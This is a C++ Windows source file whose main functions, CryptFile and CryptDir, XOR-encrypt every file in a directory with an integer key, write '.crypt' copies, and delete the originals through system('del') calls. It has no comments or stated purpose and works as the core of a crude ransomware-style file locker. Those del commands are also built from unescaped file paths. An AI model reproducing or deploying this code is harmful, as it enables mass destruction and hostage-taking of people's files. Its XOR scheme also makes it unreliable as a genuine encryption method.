#include <string>
#include <fstream>
#include <vector>
#include <windows.h>

std::wstring string_to_wstring(std::string& s) {
	std::ofstream ofs("temp.txt", std::ofstream::out);
	if (!ofs) exit(1);
	ofs << s;
	ofs.close();

	std::wstring s1;
	std::wifstream wifs("temp.txt", std::wifstream::in);
	if (!wifs) exit(1);
	wifs >> s1;
	wifs.close();
	system("del temp.txt");
	return s1;
}

std::string wstring_to_string(std::wstring s) {
	std::wofstream wofs("temp.txt", std::wofstream::out);
	if (!wofs) exit(1);
	wofs << s;
	wofs.close();

	std::string s1;
	std::ifstream ifs("temp.txt", std::ifstream::in);
	if (!ifs) exit(1);
	ifs >> s1;
	ifs.close();
	system("del temp.txt");
	return s1;
}

std::string readFile(const std::string fileName) {
	std::ifstream f(fileName);
	f.seekg(0, std::ios::end);
	size_t size = f.tellg();
	std::string s(size, ' ');
	f.seekg(0);
	f.read(&s[0], size);
	return s;
}

std::vector<std::string> scandir(std::string p) {
	std::wstring Path = string_to_wstring(p);

	WIN32_FIND_DATA FindFileData;
	HANDLE hf;

	hf = FindFirstFile((string_to_wstring(p)).c_str(), &FindFileData);

	std::vector<std::string> v;
	if (hf != INVALID_HANDLE_VALUE) {
		do {
			if (FindFileData.dwFileAttributes != FILE_ATTRIBUTE_DIRECTORY)
				v.push_back(wstring_to_string(FindFileData.cFileName));
		} while (FindNextFile(hf, &FindFileData) != 0);
	}

	return v;
}

std::string CryptFile(std::string path, int key) {
	try {
		std::string data = readFile(path), delcmd = "del " + path, cryptdata;
		for (unsigned int item = 0; item < data.length(); ++item)
			cryptdata += data[item] ^ key;

		std::ofstream crfile(path + ".crypt");
		for (unsigned int item = 0; item < cryptdata.length(); ++item)
			crfile << cryptdata[item];

		crfile.close();
		system(delcmd.c_str());
		return "crypt " + path + " ok";
	}
	catch (...) {
		return "crypt " + path + " failed";
	}
}

std::string CryptDir(std::string path, int key) {
	std::string buf;
	std::vector<std::string> v;
	v = scandir(path + "*");
	for (unsigned int i = 0; i < v.size(); i++) {
		try {
			CryptFile(path + v[i], key);
			buf += "crypt " + path + v[i] + " ok\n";
		}
		catch (...) {
			continue;
		}
	}
	return buf;
}